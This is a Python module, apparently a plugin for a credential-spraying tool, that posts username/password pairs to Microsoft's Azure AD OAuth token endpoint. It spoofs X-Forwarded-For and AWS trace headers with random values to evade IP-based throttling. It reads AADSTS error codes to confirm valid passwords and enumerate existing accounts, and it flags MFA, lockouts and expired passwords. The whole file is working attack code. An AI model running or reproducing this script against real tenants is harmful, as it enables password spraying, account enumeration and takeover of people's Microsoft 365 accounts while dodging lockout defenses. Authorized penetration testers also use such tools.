import json, datetime, requests, random


def generate_ip():

    return ".".join(str(random.randint(0,255)) for _ in range(4))


def generate_id():

    return "".join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(10))


def generate_trace_id():
    str = "Root=1-"
    first = "".join(random.choice("0123456789abcdef") for _ in range(8))
    second = "".join(random.choice("0123456789abcdef") for _ in range(24))
    return str + first + "-" + second


def msol_authenticate(url, username, password, useragent, pluginargs):
    
    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    data_response = {
        'timestamp': ts,
        'username': username,
        'password': password,
        'success': False,
        'change': False,
        '2fa_enabled': False,
        'type': None,
        'code': None,
        'name': None,
        'action': None,
        'headers': [],
        'cookies': [],
		'sourceip' : None,
        'throttled' : False,
		'error' : False,
        'output' : ""
    }

    body = {
        'resource': 'https://graph.windows.net',
        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
        'client_info': '1',
        'grant_type': 'password',
        'username': username,
        'password': password,
        'scope': 'openid',
    }

    spoofed_ip = generate_ip()
    amazon_id = generate_id()
    trace_id = generate_trace_id()

    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id
    }

    try:
        resp = requests.post("{}/common/oauth2/token".format(url), headers=headers, data=body)
        data_response['code'] = resp.status_code

        if resp.status_code == 200:
            data_response['success'] = True
            data_response['output'] = f"SUCCESS! {resp.status_code} {username} : {password}"

        else:
            response = resp.json()
            error = response["error_description"]

            if "AADSTS50126" in error:
                data_response['success'] = False
                data_response['output'] = f"FAILED. {resp.status_code} Invalid username or password. Username: {username} could exist."

            elif "AADSTS50128" in error or "AADSTS50059" in error:
                data_response['success'] = False
                data_response['output'] = f"FAILED. {resp.status_code} Tenant for account {username} is not using AzureAD/Office365"

            elif "AADSTS50034" in error:
                data_response['success'] = False
                data_response['output'] = f"FAILED. {resp.status_code} The user {username} doesn't exist."

            elif "AADSTS50079" in error or "AADSTS50076" in error:
                # Microsoft MFA response
                data_response['2fa_enabled'] = True
                data_response['success'] = True
                data_response['code'] = "2FA Microsoft"
                data_response['output'] = f"SUCCESS! {resp.status_code} {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use."


            elif "AADSTS50158" in error:
                # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                data_response['2fa_enabled'] = True
                data_response['success'] = True
                data_response['code'] = "2FA Other"
                data_response['output'] = f"SUCCESS! {resp.status_code} {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."


            elif "AADSTS50053" in error:
                # Locked out account or Smart Lockout in place
                data_response['success'] = False
                data_response['error'] ='locked out'
                data_response['output'] = f"WARNING! {resp.status_code} The account {username} appears to be locked."


            elif "AADSTS50055" in error:
                # User password is expired
                data_response['change'] = True
                data_response['success'] = True
                data_response['output'] = f"SUCCESS! {resp.status_code} {username} : {password} - NOTE: The user's password is expired."

            else:
                # Unknown errors
                data_response['success'] = False
                data_response['error'] = 'Unknown error'
                data_response['output'] = f"FAILED. {resp.status_code} Got an error we haven't seen yet for user {username}"

    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
